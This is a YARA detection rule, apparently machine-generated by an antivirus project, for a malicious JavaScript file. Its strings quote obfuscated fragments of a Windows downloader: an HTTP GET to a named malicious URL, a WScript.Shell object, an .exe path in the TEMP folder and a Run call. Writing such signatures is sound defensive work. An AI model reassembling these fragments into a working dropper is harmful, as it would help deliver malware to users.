rule sig_20160330_d0b7ed2d1e39d21321265989c315ef15 {
  meta:
    description = "datamaliciousorder - file 20160330_d0b7ed2d1e39d21321265989c315ef15.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fc05d79c6fe4efceec77ffdf10d21ddb22bc5ae2a8e4b4be337ce99c5eca890e"

  strings:
    $s1  = "Y1[W](\"GET\", \"http://buygrocery.nz/l7dsp\", false);" fullword ascii
    $s2  = "var O0 = function MR() {return WScript[T](\"WScript\"+\".Shell\");}(), TM = 11;" fullword ascii
    $s3  = "function SJ(Y2, I0){LJ = LJ * 1; return Y2 - I0;};" fullword ascii
    $s4  = "if (Y1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Y() {return O0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gc7EMfAOQOi6MK6.ex\" + \"e\";};" fullword ascii
    $s6  = "function Q(){return Z + \"\";};" fullword ascii
    $s7  = "function CY() {return ((IJ == true) && (IJ == T0)) ? 1 : LJ;};" fullword ascii
    $s8  = "function O(DH){O0[\"Run\"](DH, LJ, LJ);};" fullword ascii
    $s9  = "function K()" fullword ascii
    $s10 = "function UP(){return T;};" fullword ascii
    $s11 = "}while (N);" fullword ascii
    $s12 = "function X(OC) {var K0 = (1, 2, 3, 4, 5, OC); return K0;};" fullword ascii
    $s13 = "return SJ(H, AJ);" fullword ascii
    $s14 = "function WO(){return 22;};" fullword ascii
    $s15 = "var FY = new this[\"Date\"]();" fullword ascii
    $s16 = "IJ = true; " fullword ascii
    $s17 = "var T0 = false;" fullword ascii
    $s18 = "var IJ = false;" fullword ascii
    $s19 = "T0 = true; " fullword ascii
    $s20 = "var EI = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}